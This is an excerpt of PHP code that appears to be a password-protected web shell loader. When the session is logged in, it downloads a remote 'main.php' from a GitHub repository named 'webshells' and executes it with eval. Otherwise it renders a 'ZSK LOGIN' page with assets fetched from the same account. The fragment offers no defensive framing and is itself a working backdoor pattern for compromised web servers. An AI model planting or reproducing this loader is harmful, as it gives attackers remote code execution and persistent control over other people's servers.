...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/awokawok-zsk/webshells/refs/heads/main/main.php');
    eval('?>' . $a);
} else {
    ...
    <head>
        ...
        <style>
            @font-face {
                ...
                src: url('https://raw.githubusercontent.com/awokawok-zsk/image-properties/main/who%20asks%20satan.ttf') format('truetype');
            }
    ...
    <center>
        <form action="" method="POST">
            <img src="https://raw.githubusercontent.com/awokawok-zsk/image-properties/main/chibi_jeff.png" alt="logo">
            <h1 class="title">ZSK LOGIN</h1> 
